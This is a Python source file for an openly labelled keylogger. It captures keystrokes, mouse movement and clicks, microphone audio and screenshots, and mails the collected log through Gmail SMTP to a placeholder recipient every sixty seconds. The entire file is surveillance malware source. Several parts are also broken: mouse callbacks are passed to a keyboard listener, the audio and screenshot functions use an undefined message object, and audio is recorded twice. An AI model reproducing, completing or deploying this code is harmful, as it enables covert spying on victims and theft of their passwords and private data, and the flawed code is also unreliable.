import logging
import os
import platform
import smtplib
import socket
import threading
import wave
import sounddevice as sd
from pynput import keyboard
from pynput.keyboard import Listener
from email import encoders
from email.mime.base import MIMEBase
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
import pyscreenshot
import email
import time

# Configuration (use environment variables for security)
try:
    EMAIL_ADDRESS = os.environ["EMAIL_ADDRESS"]
    EMAIL_PASSWORD = os.environ["EMAIL_PASSWORD"]
except KeyError as e:
    print(f"Error: Missing environment variable {e}.  Please set EMAIL_ADDRESS and EMAIL_PASSWORD.")
    exit(1)
SEND_REPORT_EVERY = 60  # in seconds


class KeyLogger:
    def __init__(self, time_interval, email, password):
        self.interval = time_interval
        self.log = ""
        self.email = email
        self.password = password
        self.log_file = "keylog.txt"
        self.log_format = "%(asctime)s - %(message)s"
        logging.basicConfig(filename=self.log_file, level=logging.INFO, format=self.log_format)
        logging.info("Keylogger started")

    def append_log(self, message):
        self.log += str(message) + "\n"
        logging.info(message)  # Log to file and console

    def on_press(self, key):
        try:
            self.append_log(f"Key pressed: {key.char}")
        except AttributeError:
            self.append_log(f"Key pressed: {key}")

    def on_release(self, key):
        if key == keyboard.Key.esc:
            # Stop listener
            return False

    def on_mouse_move(self, x, y):
        self.append_log(f"Mouse moved to: ({x}, {y})")

    def on_mouse_click(self, x, y, button, pressed):
        self.append_log(f"Mouse click at ({x}, {y}), button: {button}, pressed: {pressed}")

    def on_mouse_scroll(self, x, y, dx, dy):
        self.append_log(f"Mouse wheel scrolled at ({x}, {y}), dx: {dx}, dy: {dy}")

    def send_email(self):
        msg = MIMEMultipart()
        msg["Subject"] = "Keylogger Report"
        msg["From"] = f"Keylogger <{EMAIL_ADDRESS}>"
        msg["To"] = f"Recipient <recipient@example.com>"  # Replace with actual recipient

        msg.attach(MIMEText(self.log))

        with smtplib.SMTP_SSL("smtp.gmail.com", 465) as server:  # Example for Gmail
            server.login(self.email, self.password)
            server.send_message(msg)

        self.log = ""  # Clear log after sending
        logging.info("Email sent successfully.")

    def record_audio(self):
        try:
            fs = 44100
            seconds = SEND_REPORT_EVERY
            filename = "audio.wav"
            sd.rec(int(seconds * fs), samplerate=fs, channels=2, blocking=True, dtype="float32")
            sd.wait()

            with wave.open(filename, 'wb') as wf:
                wf.setnchannels(2)  # Assuming stereo
                wf.setsampwidth(4)  # 4 bytes for float32
                wf.setframerate(fs)
                wf.writeframes(sd.rec(int(seconds * fs), samplerate=fs, channels=2, blocking=True, dtype="float32"))

            # Attach audio file to email
            with open(filename, "rb") as attachment:
                part = MIMEBase("application", "octet-stream")
                part.set_payload(attachment.read())
            encoders.encode_base64(part)
            part.add_header("Content-Disposition", f"attachment; filename= {filename}")
            msg.attach(part)


        except Exception as e:
            logging.error(f"Error recording audio: {e}")

    def take_screenshot(self):
        try:
            filename = "screenshot.png"
            pyscreenshot.grab().save(filename)
            # Attach screenshot file to email
            with open(filename, "rb") as attachment:
                part = MIMEBase("image", "png")
                part.set_payload(attachment.read())
            encoders.encode_base64(part)
            part.add_header("Content-Disposition", f"attachment; filename= {filename}")
            msg.attach(part)
        except Exception as e:
            logging.error(f"Error taking screenshot: {e}")

    def run(self):
        with Listener(on_press=self.on_press, on_release=self.on_release,
                      on_move=self.on_mouse_move, on_click=self.on_mouse_click,
                      on_scroll=self.on_mouse_scroll) as listener:
            try:
                self.append_log("Keylogger listener started")
                timer = threading.Timer(self.interval, self.send_email)
                timer.start()
                listener.join()

                # Add audio and screenshot recording
                self.record_audio()
                self.take_screenshot()

                self.append_log("Keylogger stopped")
            except Exception as e:
                logging.exception(f"An error occurred in the listener: {e}")


keylogger = KeyLogger(SEND_REPORT_EVERY, EMAIL_ADDRESS, EMAIL_PASSWORD)
keylogger.run()